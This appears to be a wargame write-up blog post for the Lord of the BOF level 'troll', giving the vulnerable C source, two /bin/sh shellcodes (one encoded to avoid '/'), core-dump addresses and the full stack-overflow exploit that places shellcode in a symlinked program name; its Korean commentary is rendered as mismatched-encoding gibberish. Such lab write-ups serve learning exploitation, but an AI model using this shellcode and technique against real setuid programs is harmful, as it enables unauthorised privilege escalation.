---
layout: post
title:  "[LOB]Level08. troll"
subtitle:   "[LOB]orge â†’ troll"
categories: LOB
tags:
- Wargame
- LOB
- Write-up
---

## keyword : check argc

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){
		printf("argc must be two!\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

    // buffer hunter
    memset(buffer, 0, 40);

	// one more!
	memset(argv[1], 0, strlen(argv[1]));
}
```

```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

```
'\x2f'ì—†ëŠ” shell(48byte) = 
\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
```



 argcì˜ ê°œìˆ˜ë¥¼ 2ë¡œ ì •í•´ì¡Œìœ¼ë¯€ë¡œ, argv[2]ë¥¼ ì‚¬ìš© í•˜ì§€ ëª»í•œë‹¤.

bufferë‚´ìš©ë„ 0ìœ¼ë¡œ ì´ˆê¸°í™” ë˜ë©°, argv[1]ë¥¼ ì´ìš©í•´ì„œ argv[2]ë¥¼ ë®ìœ¼ë ¤ê³  í•´ë„ ê¸¸ì´ê°€ 48ì„ ë„˜ì–´ ê°ˆ ìˆ˜ ì—†ë‹¤.

ê·¸ë¦¬ê³  argv[1]ì— ë„£ì€ ë§Œí¼ 0ìœ¼ë¡œ ì´ˆê¸°í™” ëœë‹¤.



íŠ¸ë¡¤ ë§ë„¤... ğŸ˜©ğŸ˜«



ì´ˆê¸°í™” ì•ˆëœ ì˜ì—­ì€ argv[0]ì˜ì—­ ë°–ì— ì—†ë‹¤. ì´ë¥¼ ì´ìš©í•˜ì.

`python -c 'print "A"*44+"\xbf"*4'`

ìœ¼ë¡œ coreë¥¼ ìƒì„± í•œ í›„, coreë¤í”„ì—ì„œ x/32s $esp ë¡œ ë³´ë‹¤ë³´ë©´ íŒŒì¼ ì´ë¦„ì´ ë“¤ì–´ê°„ ì£¼ì†Œê°€ ë³´ì¸ë‹¤.

```sh
0xbffffc44:	 ""
0xbffffc45:	 ""
0xbffffc46:	 ""
0xbffffc47:	 "i686"
0xbffffc4c:	 "./trola"
0xbffffc54:	 ""
0xbffffc55:	 ""
0xbffffc56:	 ""
```



ì´ì œ argv[0]ì— ì‰˜ì½”ë“œë¥¼ ë„£ì–´ì•¼ í•œë‹¤.

> ì´ë•Œ ì¤‘ìš”í•œê²ƒì€ ì‰˜ì½”ë“œì— '\x2f'ê°’ì´ ì—†ì–´ì•¼ í•œë‹¤. ì´ìœ ëŠ” '/'ë¬¸ìì—´ì´ '\x2f'ì´ê¸° ë•Œë¬¸ì—, ê²½ë¡œë¡œ ì¸ì‹í•˜ê²Œ ë•Œë¬¸ì´ë‹¤.



ì´ë•Œ ì‹¬ë³¼ë¦­ë§í¬ë¥¼ ì‚¬ìš©í•´ì•¼ í•œë‹¤.

```sh
[orge@localhost orge]$ ln -s troll `python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
[orge@localhost orge]$ ls
core
trola
troll
troll.c
??????????????????????????????????????????????????ï¿½?^1É±2?l?ï¿½??ï¿½?uï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½ï¿½2ï¿½Qi00tii0cjo?ï¿½QT?ï¿½?ï¿½?ï¿½?
```

```sh
0xbffffa89:	 ""
0xbffffa8a:	 ""
0xbffffa8b:	 "i686"
0xbffffa90:	 "./", '\220' <repeats 105 times>, "ï¿½\021^1É±2\200l\016ï¿½\001\200ï¿½\001uï¿½ï¿½\005ï¿½ï¿½ï¿½ï¿½ï¿½2ï¿½Qi00tii0cjo\212ï¿½QT\212ï¿½\232ï¿½\fï¿½\201"
0xbffffb2c:	 ""
0xbffffb2d:	 ""
```

```
./`python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "A"*44+"\x90\xfa\xff\xbf"'`
```



ì‰˜ì½”ë“œë¥¼ íŒŒì¼ ì´ë¦„ìœ¼ë¡œ ì‹¬ë³¼ë¦­ ë§í¬ í–ˆê¸° ë•Œë¬¸ì—, ì‰˜ì½”ë“œë¥¼ íŒŒì¼ë¡œ ì¸ì‹ì„ í•˜ê²Œ ë˜ê³ , mainí•¨ìˆ˜ì˜ retê°€ argv[0]ì„ ê°€ë¦¬í‚¤ê³  ìˆëŠ”ë° í•´ë‹¹ ì£¼ì†Œì—ëŠ” ì‰˜ì½”ë“œê°€ ìˆê¸° ë•Œë¬¸ì— ì‰˜ì´ ì‹¤í–‰ëœë‹¤.



##### **troll / aspirin**